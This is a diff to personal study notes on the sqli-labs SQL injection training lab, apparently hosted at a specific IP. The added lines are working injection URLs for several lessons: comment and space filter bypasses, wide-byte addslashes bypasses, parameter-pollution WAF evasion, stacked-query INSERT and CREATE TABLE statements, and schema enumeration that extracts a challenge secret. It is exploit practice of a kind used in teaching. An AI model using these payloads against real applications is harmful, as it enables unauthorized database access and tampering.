@@ -153,6 +153,9 @@ Page-2 (Advanced Injections)
 		//print_r(mysql_error());
 		
 	less 26  Trick with comments and space (过滤了注释和空格的注入)
+		http://1.117.162.201/sqli/Less-26/?id=1'%a0||'1
+			%09 TAB 键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键（垂直） %a0 空格 
+		
 		$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
 		$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
 		$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
@@ -165,6 +168,8 @@ Page-2 (Advanced Injections)
 		//print_r(mysql_error());
 		
 	less 27 GET - Error Based- All your UNION & SELECT belong to us （过滤了union和select的）
+		http://1.117.162.201/sqli/Less-27/?id=100'unIon%a0SelEcT%a01,database(),3||'1
+		
 		$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
 		$id= preg_replace('/[--]/',"", $id);		//Strip out --.
 		$id= preg_replace('/[#]/',"", $id);			//Strip out #.
@@ -179,6 +184,8 @@ Page-2 (Advanced Injections)
 		$id= preg_replace('/Select/s',"", $id);	    //Strip out select
 
 	less 28 GET - Error Based- All your UNION & SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入
+		http://1.117.162.201/sqli/Less-28/?id=100')union%a0select(1),(user()),(3)||('1
+		
 		$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
 		$id= preg_replace('/[--]/',"", $id);				//Strip out --.
 		$id= preg_replace('/[#]/',"", $id);					//Strip out #.
@@ -188,19 +195,28 @@ Page-2 (Advanced Injections)
 		$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
 
 	Less-29 基于WAF的一个错误
+		http://1.117.162.201/sqli/Less-29/index.php?id=1&id=-2%27union%20select%201,user(),3-- +
+		
 		$match = preg_match("/^\d+$/", $input);
 
 	Less-30 Get-Blind Havaing with WAF
+		http://1.117.162.201/sqli/Less-30/index.php?id=1&id=-2"union%20select%201,user(),3--+
+		
 		//print_r(mysql_error());
 		
 	Less-31 Protection with WAF
-
+		http://1.117.162.201/sqli/Less-31/index.php?id=1&id=-2%22)union%20select%201,user(),3 --+
+		
 	Less-32 Bypass addslashes()
+		http://1.117.162.201/sqli/Less-32/index.php?id=-1%df%27union%20select%201,user(),3--+
+	
 		$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //逃离任何反斜杠
 		$string = preg_replace('/\'/i', '\\\'', $string);                               //使用反斜杠逃脱单引用
 		$string = preg_replace('/\"/', "\\\"", $string);                                //使用反斜杠逃脱双重报价
 		
 	Less-33 Bypass addslashes()
+		http://1.117.162.201/sqli/Less-33/index.php?id=-1%df%27union%20select%201,user(),3--+
+		
 		for ($i=0; $i < strlen($string); $i++)
 			$hex .= dechex(ord($string[$i]));
     
@@ -209,11 +225,15 @@ Page-2 (Advanced Injections)
 		@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
 		 
 	Less-35 why care for addslashes()
+		http://1.117.162.201/sqli/Less-35/?id=-1%20%20union%20select%201,user(),3--+
+		
 		$uname = addslashes($uname1);$passwd= addslashes($passwd1);
 		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 		
 	less-36
+		http://1.117.162.201/sqli/Less-36/?id=-1%EF%BF%BD%27union%20select%201,user(),3--+
+		
 		for ($i=0; $i < strlen($string); $i++)
 			$hex .= dechex(ord($string[$i]));
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
@@ -224,9 +244,13 @@ Page-2 (Advanced Injections)
 		
 Page-3 (Stacked Injections)
 	less-38
+		http://1.117.162.201/sqli/Less-38/?id=1%27;insert into users(id,username,pass word) values ('38','less38','hello')--+
+		
 		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 		
 	less-39
+		http://1.117.162.201/sqli/Less-39/?id=1;insert into users(id,username,password)  values ('39','less39','hello')--+
+		
 		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 		
 	less-40
@@ -256,6 +280,8 @@ Page-3 (Stacked Injections)
 		$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
 		
 	less-46
+		http://1.117.162.201/sqli/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+		
 		$sql = "SELECT * FROM users ORDER BY $id";
 		
 	less-47
@@ -268,6 +294,8 @@ Page-3 (Stacked Injections)
 		$sql = "SELECT * FROM users ORDER BY $id";
 		
 	less-50
+		http://1.117.162.201/sqli/Less-50/?sort=1;create table less50 like users
+		
 		$sql = "SELECT * FROM users ORDER BY $id";
 		
 	less-51
@@ -281,6 +309,10 @@ Page-3 (Stacked Injections)
 	
 Page-4 (Challenges Injections)
 	less-54
+		http://1.117.162.201/sqli/Less-54/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+
+		http://1.117.162.201/sqli/Less-54/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='22HSEVNKYK'--+
+		http://1.117.162.201/sqli/Less-54/?id=-1'union select 1,2,group_concat(secret_G5V8) from challenges.22HSEVNKYK--+
+		
 		$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
 		
 	less-55
@@ -302,12 +334,7 @@ Page-4 (Challenges Injections)
 		$id = '("'.$id.'")';
 		$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
 		
-	less-61
-	less-62
-	less-63
-	less-64
-	less-65
-
+	
 		
 		
 		
